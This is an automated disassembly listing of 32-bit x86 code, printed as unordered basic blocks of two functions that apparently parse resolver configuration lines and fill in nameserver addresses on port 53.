0xb10a1cb:	mov	ecx, dword ptr [esp + 0x14]
0xb10a1cf:	mov	edx, 5
0xb10a1d4:	cmp	eax, 5
0xb10a1d7:	cmovg	eax, edx
0xb10a1da:	mov	dword ptr [ecx + 4], eax
0xb10a1dd:	jmp	0xb10a0e8
None
|
|
|
v
0xb10a07c:	mov	ecx, 8
0xb10a081:	mov	esi, ebp
0xb10a083:	lea	edi, dword ptr [ebx - 0x475df]
0xb10a089:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb10a0fc:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb10a0d4:	test	eax, eax
0xb10a0d6:	je	0xb10a200
None
|
|
|
v
0xb10a1b0:	lea	eax, dword ptr [ebp + 9]
0xb10a1b3:	mov	dword ptr [esp + 8], 0xa
0xb10a1bb:	mov	dword ptr [esp + 4], 0
0xb10a1c3:	mov	dword ptr [esp], eax
0xb10a1c6:	call	0xb034640
None
|
|
|
v
0xb10a063:	cmp	al, 0x20
0xb10a065:	je	0xb10a058
None
|
|
|
v
0xb10a1f8:	add	esp, 0x2c
0xb10a1fb:	pop	ebx
0xb10a1fc:	pop	esi
0xb10a1fd:	pop	edi
0xb10a1fe:	pop	ebp
0xb10a1ff:	ret	
None
|
|
|
v
0xb10a0dc:	add	edi, 1
0xb10a0df:	add	esi, 0x1c
0xb10a0e2:	cmp	edi, 0xc
0xb10a0e5:	jne	0xb10a0c0
None
|
|
|
v
0xb10a089:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb10a09e:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb10a020:	push	ebp
0xb10a021:	mov	ebp, edx
0xb10a023:	push	edi
0xb10a024:	push	esi
0xb10a025:	push	ebx
0xb10a026:	call	0xb1267db
None
|
|
|
v
0xb10a0b3:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb10a076:	je	0xb10a130
None
|
|
|
v
0xb10a120:	cmp	al, 9
0xb10a122:	je	0xb10a058
None
|
|
|
v
0xb10a08b:	je	0xb10a178
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b10a230
TOTAL BLOCKS :195
0xb10a7d0:	add	eax, 1
0xb10a7d3:	movzx	edx, byte ptr [eax]
0xb10a7d6:	cmp	dl, 9
0xb10a7d9:	je	0xb10a7d0
None
|
|
|
v
0xb10ab39:	mov	eax, dword ptr [ebp + 8]
0xb10ab3c:	or	dword ptr [eax + 8], 1
0xb10ab40:	xor	eax, eax
0xb10ab42:	lea	esp, dword ptr [ebp - 0xc]
0xb10ab45:	pop	ebx
0xb10ab46:	pop	esi
0xb10ab47:	pop	edi
0xb10ab48:	pop	ebp
0xb10ab49:	ret	
None
|
|
|
v
0xb10a8d7:	add	esi, 1
0xb10a8da:	movzx	eax, byte ptr [esi]
0xb10a8dd:	test	al, al
0xb10a8df:	je	0xb10a8e8
None
|
|
|
v
0xb10a999:	mov	edi, dword ptr [ebp + 8]
0xb10a99c:	mov	ecx, dword ptr [ebp - 0x2064]
0xb10a9a2:	add	dword ptr [ebp - 0x2064], 1
0xb10a9a9:	lea	eax, dword ptr [edi + ecx*4]
0xb10a9ac:	mov	dword ptr [eax + 0x1e4], esi
0xb10a9b2:	mov	esi, edi
0xb10a9b4:	mov	edi, 4
0xb10a9b9:	mov	dword ptr [eax + 0x1d4], 0xffffffff
0xb10a9c3:	mov	word ptr [esi + ecx*2 + 0x1ce], di
0xb10a9cb:	jmp	0xb10a448
None
|
|
|
v
0xb10a26d:	mov	eax, dword ptr [ebp + 8]
0xb10a270:	xor	edx, edx
0xb10a272:	xor	esi, esi
0xb10a274:	mov	ecx, dword ptr [ebp + 8]
0xb10a277:	mov	edi, 3
0xb10a27c:	mov	dword ptr [eax + 0xc], 0
0xb10a283:	movzx	eax, byte ptr [eax + 0x164]
0xb10a28a:	mov	word ptr [ecx + 0x1e2], dx
0xb10a291:	mov	edx, 3
0xb10a296:	mov	dword ptr [ecx + 0x160], 0
0xb10a2a0:	mov	dword ptr [ecx + 0x1c4], 0xffffffff
0xb10a2aa:	mov	byte ptr [ebp - 0x2040], al
0xb10a2b0:	and	eax, 0xfffffff0
0xb10a2b3:	or	eax, 1
0xb10a2b6:	mov	byte ptr [ecx + 0x164], al
0xb10a2bc:	mov	eax, ecx
0xb10a2be:	mov	dword ptr [ecx + 0x1c8], 0
0xb10a2c8:	mov	dword ptr [ecx + 0x1b8], 0
0xb10a2d2:	mov	dword ptr [ecx + 0x1bc], 0
0xb10a2dc:	xor	ecx, ecx
0xb10a2de:	mov	word ptr [eax + 0x1cc], cx
0xb10a2e5:	mov	ecx, 3
0xb10a2ea:	mov	word ptr [eax + 0x1e0], si
0xb10a2f1:	mov	dword ptr [eax + 0x1e4], 0
0xb10a2fb:	mov	word ptr [eax + 0x1ce], di
0xb10a302:	mov	dword ptr [eax + 0x1e8], 0
0xb10a30c:	mov	word ptr [eax + 0x1d0], dx
0xb10a313:	mov	dword ptr [eax + 0x1ec], 0
0xb10a31d:	mov	word ptr [eax + 0x1d2], cx
0xb10a324:	lea	eax, dword ptr [ebx - 0x475c6]
0xb10a32a:	mov	dword ptr [esp], eax
0xb10a32d:	call	0xb032860
None
|
|
|
v
0xb10a8b2:	cmp	al, 0x20
0xb10a8b4:	je	0xb10a8a8
None
|
|
|
v
0xb10a7f1:	mov	ecx, dword ptr [ebp + 8]
0xb10a7f4:	mov	dword ptr [esp + 8], 0xff
0xb10a7fc:	mov	dword ptr [esp + 4], eax
0xb10a800:	lea	esi, dword ptr [ecx + 0x60]
0xb10a803:	mov	dword ptr [esp], esi
0xb10a806:	call	0xb0830a0
None
|
|
|
v
0xb10ac3e:	mov	esi, edi
0xb10ac40:	mov	dword ptr [ebp - 0x2040], 0
0xb10ac4a:	jmp	0xb10a6a5
None
|
|
|
v
0xb10a695:	mov	ecx, esi
0xb10a697:	mov	esi, edi
0xb10a699:	mov	edi, dword ptr [ebp - 0x2058]
0xb10a69f:	mov	dword ptr [ebp - 0x2040], ecx
0xb10a6a5:	lea	eax, dword ptr [ebp - 0x2028]
0xb10a6ab:	mov	byte ptr [esi], 0
0xb10a6ae:	mov	dword ptr [esp + 4], eax
0xb10a6b2:	mov	dword ptr [esp], edi
0xb10a6b5:	mov	dword ptr [ebp - 0x2044], edx
0xb10a6bb:	mov	dword ptr [ebp - 0x2048], eax
0xb10a6c1:	call	0xb109600
None
|
|
|
v
0xb10a8e8:	mov	dword ptr [esp + 4], 0x25
0xb10a8f0:	mov	dword ptr [esp], edi
0xb10a8f3:	call	0xb07a520
None
|
|
|
v
0xb10ab04:	mov	eax, dword ptr [ebp + 8]
0xb10ab07:	mov	ecx, dword ptr [ebp + 8]
0xb10ab0a:	add	eax, 0x60
0xb10ab0d:	mov	dword ptr [ecx + 0x44], eax
0xb10ab10:	mov	dword ptr [ecx + 0x48], 0
0xb10ab17:	lea	eax, dword ptr [ebx - 0x47587]
0xb10ab1d:	mov	dword ptr [esp], eax
0xb10ab20:	call	0xb032860
None
|
|
|
v
0xb10a4d9:	test	dl, dl
0xb10a4db:	je	0xb10a448
None
|
|
|
v
0xb10a651:	test	dl, dl
0xb10a653:	js	0xb10a695
None
|
|
|
v
0xb10a68b:	mov	edx, dword ptr [ebp - 0x2040]
0xb10a691:	test	eax, eax
0xb10a693:	je	0xb10a648
None
|
|
|
v
0xb10a589:	movzx	eax, byte ptr [ebp - 0x200e]
0xb10a590:	cmp	al, 9
0xb10a592:	je	0xb10a890
None
|
|
|
v
0xb10a8f8:	test	eax, eax
0xb10a8fa:	mov	edx, eax
0xb10a8fc:	je	0xb10a901
None
|
|
|
v
0xb10a52d:	cmp	al, 0x20
0xb10a52f:	jne	0xb10a518
None
|
|
|
v
0xb10a8e1:	cmp	al, 0x20
0xb10a8e3:	jne	0xb10a8d0
None
|
|
|
v
0xb10a757:	test	byte ptr [eax + ecx*2 + 1], 0x20
0xb10a75c:	je	0xb10a748
None
|
|
|
v
0xb10a5d9:	lea	esi, dword ptr [ebp - 0x2010]
0xb10a5df:	nop	
0xb10a5e0:	cmp	al, 9
0xb10a5e2:	mov	edi, esi
0xb10a5e4:	jne	0xb10a5f2
None
|
|
|
v
0xb10a354:	mov	eax, dword ptr [ebp + 8]
0xb10a357:	mov	byte ptr [eax + 0x15f], 0
0xb10a35e:	lea	edx, dword ptr [eax + 0x48]
0xb10a361:	mov	dword ptr [eax + 0x44], esi
0xb10a364:	movzx	eax, byte ptr [eax + 0x60]
0xb10a368:	test	al, al
0xb10a36a:	je	0xb10acc5
None
|
|
|
v
0xb10a8d0:	sub	eax, 9
0xb10a8d3:	cmp	al, 1
0xb10a8d5:	jbe	0xb10a8e5
None
|
|
|
v
0xb10acba:	mov	esi, dword ptr [ebp - 0x2044]
0xb10acc0:	jmp	0xb10a75e
None
|
|
|
v
0xb10abbc:	mov	ecx, dword ptr [ebp + 8]
0xb10abbf:	mov	word ptr [ecx + 0x40], ax
0xb10abc3:	jmp	0xb10a26d
None
|
|
|
v
0xb10a390:	mov	byte ptr [esi], 0
0xb10a393:	mov	ecx, 1
0xb10a398:	add	esi, 1
0xb10a39b:	movzx	eax, byte ptr [esi]
0xb10a39e:	test	al, al
0xb10a3a0:	je	0xb10a3d8
None
|
|
|
v
0xb10a79a:	mov	ecx, dword ptr [ebp - 0x2040]
0xb10a7a0:	cmp	dword ptr [ebp - 0x2050], 9
0xb10a7a7:	mov	eax, ecx
0xb10a7a9:	mov	byte ptr [esi], cl
0xb10a7ab:	jle	0xb10a5e0
None
|
|
|
v
0xb10a92a:	test	eax, eax
0xb10a92c:	jle	0xb10a448
None
|
|
|
v
0xb10a75e:	mov	eax, dword ptr [ebp - 0x2048]
0xb10a764:	mov	byte ptr [esi], 0
0xb10a767:	mov	dword ptr [ebp - 0x2040], ecx
0xb10a76d:	mov	dword ptr [esp + 4], eax
0xb10a771:	mov	eax, dword ptr [ebp - 0x2044]
0xb10a777:	mov	dword ptr [esp], eax
0xb10a77a:	call	0xb109600
None
|
|
|
v
0xb10a7c6:	lea	eax, dword ptr [ebp - 0x2012]
0xb10a7cc:	lea	esi, dword ptr [esi]
0xb10a7d0:	add	eax, 1
0xb10a7d3:	movzx	edx, byte ptr [eax]
0xb10a7d6:	cmp	dl, 9
0xb10a7d9:	je	0xb10a7d0
None
|
|
|
v
0xb10a5e8:	add	edi, 1
0xb10a5eb:	movzx	eax, byte ptr [edi]
0xb10a5ee:	cmp	al, 9
0xb10a5f0:	je	0xb10a5e8
None
|
|
|
v
0xb10ad39:	lea	eax, dword ptr [ebp - 0x202c]
0xb10ad3f:	mov	dword ptr [esp + 8], 0xa
0xb10ad47:	mov	dword ptr [esp + 4], eax
0xb10ad4b:	mov	dword ptr [esp], edi
0xb10ad4e:	call	0xb0346e0
None
|
|
|
v
0xb10a548:	mov	esi, dword ptr [ebp - 0x204c]
0xb10a54e:	mov	ecx, 6
0xb10a553:	lea	edi, dword ptr [ebx - 0x475a2]
0xb10a559:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb10a492:	jne	0xb10a548
None
|
|
|
v
0xb10a901:	cmp	byte ptr [edi], 0
0xb10a904:	je	0xb10a448
None
|
|
|
v
0xb10aafa:	mov	eax, dword ptr [ebp - 0x205c]
0xb10ab00:	test	eax, eax
0xb10ab02:	jne	0xb10ab17
None
|
|
|
v
0xb10a829:	mov	byte ptr [eax], 0
0xb10a82c:	mov	eax, dword ptr [ebp + 8]
0xb10a82f:	lea	edx, dword ptr [eax + 0x48]
0xb10a832:	mov	dword ptr [eax + 0x44], esi
0xb10a835:	movzx	eax, byte ptr [eax + 0x60]
0xb10a839:	test	al, al
0xb10a83b:	je	0xb10ac26
None
|
|
|
v
0xb10ab7e:	sub	eax, 9
0xb10ab81:	cmp	al, 1
0xb10ab83:	ja	0xb10ab70
None
|
|
|
v
0xb10abe6:	mov	dword ptr [esp + 4], 0x2e
0xb10abee:	mov	dword ptr [esp], esi
0xb10abf1:	call	0xb07a520
None
|
|
|
v
0xb10a8c7:	jmp	0xb10a8e8
None
|
|
|
v
0xb10a606:	cmp	al, 0x3b
0xb10a608:	je	0xb10a448
None
|
|
|
v
0xb10a8fe:	mov	byte ptr [eax], 0
0xb10a901:	cmp	byte ptr [edi], 0
0xb10a904:	je	0xb10a448
None
|
|
|
v
0xb10a230:	push	ebp
0xb10a231:	mov	ebp, esp
0xb10a233:	push	edi
0xb10a234:	push	esi
0xb10a235:	push	ebx
0xb10a236:	call	0xb1267db
None
|
|
|
v
0xb10a3aa:	cmp	al, 0xa
0xb10a3ac:	je	0xb10a3d8
None
|
|
|
v
0xb10a87a:	cmp	al, 0x20
0xb10a87c:	lea	esi, dword ptr [esi]
0xb10a880:	je	0xb10a858
None
|
|
|
v
0xb10a398:	add	esi, 1
0xb10a39b:	movzx	eax, byte ptr [esi]
0xb10a39e:	test	al, al
0xb10a3a0:	je	0xb10a3d8
None
|
|
|
v
0xb10a50d:	jmp	0xb10acab
None
|
|
|
v
0xb10a8e5:	mov	byte ptr [esi], 0
0xb10a8e8:	mov	dword ptr [esp + 4], 0x25
0xb10a8f0:	mov	dword ptr [esp], edi
0xb10a8f3:	call	0xb07a520
None
|
|
|
v
0xb10a5cc:	cmp	dword ptr [ebp - 0x2050], 9
0xb10a5d3:	jg	0xb10a448
None
|
|
|
v
0xb10a4c0:	add	eax, 1
0xb10a4c3:	movzx	edx, byte ptr [eax]
0xb10a4c6:	cmp	dl, 9
0xb10a4c9:	je	0xb10a4c0
None
|
|
|
v
0xb10ac71:	mov	eax, dword ptr [ebp - 0x2064]
0xb10ac77:	mov	ecx, 0x3500
0xb10ac7c:	mov	edx, dword ptr [ebp - 0x2030]
0xb10ac82:	add	dword ptr [ebp - 0x2068], 1
0xb10ac89:	add	dword ptr [ebp - 0x2064], 1
0xb10ac90:	shl	eax, 4
0xb10ac93:	add	eax, dword ptr [ebp + 8]
0xb10ac96:	mov	dword ptr [eax + 0x14], edx
0xb10ac99:	mov	edx, 2
0xb10ac9e:	mov	word ptr [eax + 0x10], dx
0xb10aca2:	mov	word ptr [eax + 0x12], cx
0xb10aca6:	jmp	0xb10a448
None
|
|
|
v
0xb10a585:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb10ac69:	test	eax, eax
0xb10ac6b:	je	0xb10a8c0
None
|
|
|
v
0xb10a724:	test	cl, cl
0xb10a726:	jle	0xb10acba
None
|
|
|
v
0xb10a531:	mov	byte ptr [esi], 0
0xb10a534:	mov	dword ptr [ebp - 0x205c], 0
0xb10a53e:	jmp	0xb10a448
None
|
|
|
v
0xb10aa92:	mov	eax, ecx
0xb10aa94:	mov	ecx, dword ptr [ebp + 8]
0xb10aa97:	sub	eax, esi
0xb10aa99:	and	byte ptr [ecx + 0x165], 0xfe
0xb10aaa0:	mov	word ptr [ecx + 0x1e0], ax
0xb10aaa7:	mov	ecx, dword ptr [ebp + 8]
0xb10aaaa:	movzx	eax, byte ptr [ebp - 0x2050]
0xb10aab1:	movzx	ecx, byte ptr [ecx + 0x164]
0xb10aab8:	shl	eax, 4
0xb10aabb:	mov	edx, ecx
0xb10aabd:	mov	byte ptr [ebp - 0x2040], cl
0xb10aac3:	mov	ecx, dword ptr [ebp + 8]
0xb10aac6:	and	edx, 0xf
0xb10aac9:	or	eax, edx
0xb10aacb:	mov	byte ptr [ecx + 0x164], al
0xb10aad1:	mov	eax, dword ptr [ebp - 0x2054]
0xb10aad7:	mov	dword ptr [esp], eax
0xb10aada:	call	0xb0634f0
None
|
|
|
v
0xb10ad83:	test	eax, eax
0xb10ad85:	mov	dword ptr [esi + 0x18], eax
0xb10ad88:	jne	0xb10a999
None
|
|
|
v
0xb10ad65:	jmp	0xb10a999
None
|
|
|
v
0xb10ad21:	and	eax, 0xc0ff
0xb10ad26:	cmp	eax, 0x80fe
0xb10ad2b:	je	0xb10ad78
None
|
|
|
v
0xb10ab6b:	jmp	0xb10a3d8
None
|
|
|
v
0xb10a4b5:	lea	eax, dword ptr [ebp - 0x2012]
0xb10a4bb:	nop	
0xb10a4bc:	lea	esi, dword ptr [esi]
0xb10a4c0:	add	eax, 1
0xb10a4c3:	movzx	edx, byte ptr [eax]
0xb10a4c6:	cmp	dl, 9
0xb10a4c9:	je	0xb10a4c0
None
|
|
|
v
0xb10a748:	add	esi, 1
0xb10a74b:	movsx	ecx, byte ptr [esi]
0xb10a74e:	cmp	cl, 0x3b
0xb10a751:	je	0xb10a75e
None
|
|
|
v
0xb10a4a3:	cmp	al, 0x20
0xb10a4a5:	jne	0xb10a548
None
|
|
|
v
0xb10a9e3:	jne	0xb10a448
None
|
|
|
v
0xb10ac1e:	test	al, 0xdf
0xb10ac20:	je	0xb10ac26
None
|
|
|
v
0xb10a787:	mov	eax, dword ptr [ebp - 0x2028]
0xb10a78d:	mov	dword ptr [edi + 0x16c], eax
0xb10a793:	add	dword ptr [ebp - 0x2050], 1
0xb10a79a:	mov	ecx, dword ptr [ebp - 0x2040]
0xb10a7a0:	cmp	dword ptr [ebp - 0x2050], 9
0xb10a7a7:	mov	eax, ecx
0xb10a7a9:	mov	byte ptr [esi], cl
0xb10a7ab:	jle	0xb10a5e0
None
|
|
|
v
0xb10ac22:	cmp	al, 9
0xb10ac24:	jne	0xb10ac18
None
|
|
|
v
0xb10aa18:	mov	eax, dword ptr [ebp + 8]
0xb10aa1b:	mov	ecx, dword ptr [ebp - 0x2050]
0xb10aa21:	mov	edx, dword ptr [eax + ecx*8 + 0x168]
0xb10aa28:	mov	eax, 0xff
0xb10aa2d:	bswap	edx
0xb10aa2f:	test	edx, edx
0xb10aa31:	js	0xb10ab4a
None
|
|
|
v
0xb10a470:	movzx	eax, byte ptr [ebp - 0x2018]
0xb10a477:	cmp	al, 0x23
0xb10a479:	je	0xb10a448
None
|
|
|
v
0xb10ab85:	jmp	0xb10a3d8
None
|
|
|
v
0xb10a3a2:	cmp	edx, edi
0xb10a3a4:	jae	0xb10ab67
None
|
|
|
v
0xb10a23b:	add	ebx, 0xa0dc5
0xb10a241:	sub	esp, 0x206c
0xb10a247:	mov	esi, dword ptr [ebp + 0xc]
0xb10a24a:	mov	ecx, dword ptr [ebp + 8]
0xb10a24d:	test	esi, esi
0xb10a24f:	mov	eax, dword ptr [ebx + 0x38e8]
0xb10a255:	mov	edx, dword ptr [ebx + 0x38ec]
0xb10a25b:	mov	dword ptr [ecx + 0x1f0], eax
0xb10a261:	mov	dword ptr [ecx + 0x1f4], edx
0xb10a267:	je	0xb10aba3
None
|
|
|
v
0xb10ab29:	mov	edx, eax
0xb10ab2b:	mov	eax, dword ptr [ebp + 8]
0xb10ab2e:	lea	ecx, dword ptr [ebx - 0x4757b]
0xb10ab34:	call	0xb10a020
None
|
|
|
v
0xb10a3d5:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb10a876:	cmp	al, 9
0xb10a878:	je	0xb10a858
None
|
|
|
v
0xb10a5fe:	test	al, al
0xb10a600:	je	0xb10a448
None
|
|
|
v
0xb10a47b:	cmp	al, 0x3b
0xb10a47d:	je	0xb10a448
None
|
|
|
v
0xb10ac26:	mov	byte ptr [esi], 0
0xb10ac29:	mov	dword ptr [ebp - 0x205c], 1
0xb10ac33:	mov	dword ptr [edx], 0
0xb10ac39:	jmp	0xb10a448
None
|
|
|
v
0xb10a574:	mov	esi, dword ptr [ebp - 0x204c]
0xb10a57a:	mov	ecx, 0xa
0xb10a57f:	lea	edi, dword ptr [ebx - 0x4759b]
0xb10a585:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb10aa37:	mov	dword ptr [edi + 0x16c], eax
0xb10aa3d:	jmp	0xb10a793
None
|
|
|
v
0xb10a559:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb10ad78:	lea	edi, dword ptr [edx + 1]
0xb10ad7b:	mov	dword ptr [esp], edi
0xb10ad7e:	call	0xb1036d0
None
|
|
|
v
0xb10a662:	add	edi, 1
0xb10a665:	movzx	edx, byte ptr [edi]
0xb10a668:	test	dl, dl
0xb10a66a:	je	0xb10aa60
None
|
|
|
v
0xb10a77f:	test	eax, eax
0xb10a781:	je	0xb10aa18
None
|
|
|
v
0xb10a948:	mov	ecx, dword ptr [ebp - 0x2024]
0xb10a94e:	mov	eax, 0xa
0xb10a953:	mov	word ptr [esi], ax
0xb10a956:	mov	edx, dword ptr [ebp - 0x2040]
0xb10a95c:	mov	eax, 0x3500
0xb10a961:	mov	word ptr [esi + 2], ax
0xb10a965:	mov	eax, dword ptr [ebp - 0x2028]
0xb10a96b:	mov	dword ptr [esi + 4], 0
0xb10a972:	mov	dword ptr [esi + 0xc], ecx
0xb10a975:	mov	ecx, dword ptr [ebp - 0x2020]
0xb10a97b:	test	edx, edx
0xb10a97d:	mov	dword ptr [esi + 8], eax
0xb10a980:	mov	dword ptr [esi + 0x10], ecx
0xb10a983:	mov	ecx, dword ptr [ebp - 0x201c]
0xb10a989:	mov	dword ptr [esi + 0x14], ecx
0xb10a98c:	jne	0xb10ad21
None
|
|
|
v
0xb10a4fb:	mov	eax, dword ptr [ebp + 8]
0xb10a4fe:	mov	byte ptr [eax + 0x15f], 0
0xb10a505:	movzx	eax, byte ptr [eax + 0x60]
0xb10a509:	test	al, al
0xb10a50b:	jne	0xb10a52d
None
|
|
|
v
0xb10a9f4:	cmp	al, 0x20
0xb10a9f6:	jne	0xb10a448
None
|
|
|
v
0xb10a8a8:	add	esi, 1
0xb10a8ab:	movzx	eax, byte ptr [esi]
0xb10a8ae:	cmp	al, 9
0xb10a8b0:	je	0xb10a8a8
None
|
|
|
v
0xb10a648:	cmp	dl, 0x3b
0xb10a64b:	je	0xb10aa48
None
|
|
|
v
0xb10a84f:	xor	ecx, ecx
0xb10a851:	jmp	0xb10a876
None
|
|
|
v
0xb10ab17:	lea	eax, dword ptr [ebx - 0x47587]
0xb10ab1d:	mov	dword ptr [esp], eax
0xb10ab20:	call	0xb032860
None
|
|
|
v
0xb10ad6a:	movzx	eax, byte ptr [ebp - 0x2027]
0xb10ad71:	and	eax, 0xf
0xb10ad74:	cmp	al, 2
0xb10ad76:	jne	0xb10ad39
None
|
|
|
v
0xb10a6a5:	lea	eax, dword ptr [ebp - 0x2028]
0xb10a6ab:	mov	byte ptr [esi], 0
0xb10a6ae:	mov	dword ptr [esp + 4], eax
0xb10a6b2:	mov	dword ptr [esp], edi
0xb10a6b5:	mov	dword ptr [ebp - 0x2044], edx
0xb10a6bb:	mov	dword ptr [ebp - 0x2048], eax
0xb10a6c1:	call	0xb109600
None
|
|
|
v
0xb10ad8e:	jmp	0xb10ad39
None
|
|
|
v
0xb10a56c:	cmp	al, 0x20
0xb10a56e:	je	0xb10a7b8
None
|
|
|
v
0xb10a82c:	mov	eax, dword ptr [ebp + 8]
0xb10a82f:	lea	edx, dword ptr [eax + 0x48]
0xb10a832:	mov	dword ptr [eax + 0x44], esi
0xb10a835:	movzx	eax, byte ptr [eax + 0x60]
0xb10a839:	test	al, al
0xb10a83b:	je	0xb10ac26
None
|
|
|
v
0xb10a7b1:	jmp	0xb10a448
None
|
|
|
v
0xb10ab25:	test	eax, eax
0xb10ab27:	je	0xb10ab39
None
|
|
|
v
0xb10a5b3:	jne	0xb10a9d0
None
|
|
|
v
0xb10a7e9:	test	dl, dl
0xb10a7eb:	je	0xb10a448
None
|
|
|
v
0xb10a448:	mov	eax, dword ptr [ebp - 0x2054]
0xb10a44e:	mov	dword ptr [esp + 4], 0x2000
0xb10a456:	mov	dword ptr [esp + 8], eax
0xb10a45a:	mov	eax, dword ptr [ebp - 0x204c]
0xb10a460:	mov	dword ptr [esp], eax
0xb10a463:	call	0xb0697e0
None
|
|
|
v
0xb10aaa7:	mov	ecx, dword ptr [ebp + 8]
0xb10aaaa:	movzx	eax, byte ptr [ebp - 0x2050]
0xb10aab1:	movzx	ecx, byte ptr [ecx + 0x164]
0xb10aab8:	shl	eax, 4
0xb10aabb:	mov	edx, ecx
0xb10aabd:	mov	byte ptr [ebp - 0x2040], cl
0xb10aac3:	mov	ecx, dword ptr [ebp + 8]
0xb10aac6:	and	edx, 0xf
0xb10aac9:	or	eax, edx
0xb10aacb:	mov	byte ptr [ecx + 0x164], al
0xb10aad1:	mov	eax, dword ptr [ebp - 0x2054]
0xb10aad7:	mov	dword ptr [esp], eax
0xb10aada:	call	0xb0634f0
None
|
|
|
v
0xb10aa78:	mov	eax, dword ptr [ebp - 0x2064]
0xb10aa7e:	mov	ecx, dword ptr [ebp + 8]
0xb10aa81:	mov	esi, dword ptr [ebp - 0x2068]
0xb10aa87:	mov	dword ptr [ecx + 0xc], eax
0xb10aa8a:	mov	ecx, eax
0xb10aa8c:	sub	eax, esi
0xb10aa8e:	test	eax, eax
0xb10aa90:	jle	0xb10aaa7
None
|
|
|
v
0xb10a3b6:	test	ecx, ecx
0xb10a3b8:	je	0xb10a398
None
|
|
|
v
0xb10a5e6:	nop	
None
|
|
|
v
0xb10a72c:	mov	edx, dword ptr [ebx - 0x110]
0xb10a732:	mov	eax, dword ptr gs:[0]
0xb10a738:	mov	esi, dword ptr [ebp - 0x2044]
0xb10a73e:	mov	eax, dword ptr [eax + edx]
0xb10a741:	jmp	0xb10a757
None
|
|
|
v
0xb10a411:	or	dword ptr [eax], 0x8000
0xb10a417:	lea	eax, dword ptr [ebp - 0x2018]
0xb10a41d:	mov	dword ptr [ebp - 0x2050], 0
0xb10a427:	mov	dword ptr [ebp - 0x2064], 0
0xb10a431:	mov	dword ptr [ebp - 0x2068], 0
0xb10a43b:	mov	dword ptr [ebp - 0x204c], eax
0xb10a441:	lea	esi, dword ptr [esi]
0xb10a448:	mov	eax, dword ptr [ebp - 0x2054]
0xb10a44e:	mov	dword ptr [esp + 4], 0x2000
0xb10a456:	mov	dword ptr [esp + 8], eax
0xb10a45a:	mov	eax, dword ptr [ebp - 0x204c]
0xb10a460:	mov	dword ptr [esp], eax
0xb10a463:	call	0xb0697e0
None
|
|
|
v
0xb10a992:	mov	dword ptr [esi + 0x18], 0
0xb10a999:	mov	edi, dword ptr [ebp + 8]
0xb10a99c:	mov	ecx, dword ptr [ebp - 0x2064]
0xb10a9a2:	add	dword ptr [ebp - 0x2064], 1
0xb10a9a9:	lea	eax, dword ptr [edi + ecx*4]
0xb10a9ac:	mov	dword ptr [eax + 0x1e4], esi
0xb10a9b2:	mov	esi, edi
0xb10a9b4:	mov	edi, 4
0xb10a9b9:	mov	dword ptr [eax + 0x1d4], 0xffffffff
0xb10a9c3:	mov	word ptr [esi + ecx*2 + 0x1ce], di
0xb10a9cb:	jmp	0xb10a448
None
|
|
|
v
0xb10ad53:	mov	dword ptr [esi + 0x18], eax
0xb10ad56:	mov	eax, dword ptr [ebp - 0x202c]
0xb10ad5c:	cmp	byte ptr [eax], 0
0xb10ad5f:	jne	0xb10a992
None
|
|
|
v
0xb10a882:	test	ecx, ecx
0xb10a884:	je	0xb10a860
None
|
|
|
v
0xb10a5f6:	cmp	al, 0xa
0xb10a5f8:	je	0xb10a448
None
|
|
|
v
0xb10a598:	cmp	al, 0x20
0xb10a59a:	je	0xb10a890
None
|
|
|
v
0xb10acf2:	mov	eax, dword ptr [ebp - 0x203c]
0xb10acf8:	mov	edx, 2
0xb10acfd:	mov	ecx, dword ptr [ebp + 8]
0xb10ad00:	mov	dword ptr [ecx + 0x14], eax
0xb10ad03:	mov	eax, ecx
0xb10ad05:	mov	word ptr [ecx + 0x10], dx
0xb10ad09:	mov	ecx, 0x3500
0xb10ad0e:	sub	esp, 4
0xb10ad11:	mov	word ptr [eax + 0x12], cx
0xb10ad15:	mov	dword ptr [eax + 0xc], 1
0xb10ad1c:	jmp	0xb10aaed
None
|
|
|
v
0xb10a5a0:	mov	esi, dword ptr [ebp - 0x204c]
0xb10a5a6:	mov	ecx, 8
0xb10a5ab:	lea	edi, dword ptr [ebx - 0x47590]
0xb10a5b1:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb10a490:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb10a9e9:	movzx	eax, byte ptr [ebp - 0x2011]
0xb10a9f0:	cmp	al, 9
0xb10a9f2:	je	0xb10a9fc
None
|
|
|
v
0xb10acab:	mov	dword ptr [ebp - 0x205c], 0
0xb10acb5:	jmp	0xb10a448
None
|
|
|
v
0xb10a9d0:	mov	esi, dword ptr [ebp - 0x204c]
0xb10a9d6:	mov	ecx, 7
0xb10a9db:	lea	edi, dword ptr [ebx - 0x47d6b]
0xb10a9e1:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb10a55d:	movzx	eax, byte ptr [ebp - 0x2012]
0xb10a564:	cmp	al, 9
0xb10a566:	je	0xb10a7b8
None
|
|
|
v
0xb10a587:	jne	0xb10a5a0
None
|
|
|
v
0xb10aba3:	mov	dword ptr [ecx], 5
0xb10aba9:	mov	dword ptr [ecx + 4], 2
0xb10abb0:	mov	dword ptr [ecx + 8], 0x802c0
0xb10abb7:	call	0xb0b69a0
None
|
|
|
v
0xb10a6c6:	test	eax, eax
0xb10a6c8:	je	0xb10a79a
None
|
|
|
v
0xb10a6fe:	mov	edx, dword ptr [ebp - 0x2044]
0xb10a704:	test	eax, eax
0xb10a706:	je	0xb10aa18
None
|
|
|
v
0xb10a80b:	mov	eax, dword ptr [ebp + 8]
0xb10a80e:	mov	byte ptr [eax + 0x15f], 0
0xb10a815:	mov	dword ptr [esp + 4], 0xa
0xb10a81d:	mov	dword ptr [esp], esi
0xb10a820:	call	0xb07a520
None
|
